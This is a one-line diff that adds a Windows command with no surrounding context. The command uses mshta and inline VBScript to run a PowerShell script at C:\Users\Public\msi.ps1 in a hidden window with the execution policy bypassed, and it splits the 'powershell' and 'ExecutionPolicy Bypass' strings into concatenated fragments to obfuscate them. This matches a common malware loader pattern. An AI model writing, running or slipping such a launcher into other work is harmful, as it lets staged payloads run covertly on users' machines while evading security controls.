@@ -1,0 +1,1 @@
+mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""p"+"ow"+"ersh"+"ell -Ex"+"ecuti"+"onPol"+"icy Bypa"+"ss & 'C"+":\Us"+"ers\P"+"ubl"+"ic\msi"+".ps1'"", 0:close")
